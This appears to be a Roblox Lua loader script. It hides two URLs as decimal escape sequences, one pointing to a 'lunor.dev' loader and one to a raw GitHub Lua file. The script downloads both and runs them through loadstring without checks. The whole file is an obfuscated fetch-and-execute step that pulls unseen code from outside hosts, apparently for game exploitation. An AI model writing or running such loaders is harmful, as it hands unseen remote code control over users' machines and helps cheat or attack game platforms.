-- Encoded URLs
local u1 = "\104\116\116\112\115\58\47\47\108\117\110\111\114\46\100\101\118\47\108\111\97\100\101\114"
local u2 = "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\85\112\100\97\116\101\115\45\83\99\114\105\112\116\47\85\112\100\97\116\101\100\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\83\99\114\105\112\116\46\108\117\97"

-- Aliases for functions
local g, t, l, p = game, task, loadstring, pcall
local h = g.HttpGet

-- Fetch both scripts
local s1, c1 = p(function() return h(g, u1) end)
local s2, c2 = p(function() return h(g, u2) end)

-- Execute both
if s1 and s2 then
    (t.spawn)(function() l(c1)() end)
    (t.spawn)(function() l(c2)() end)
end
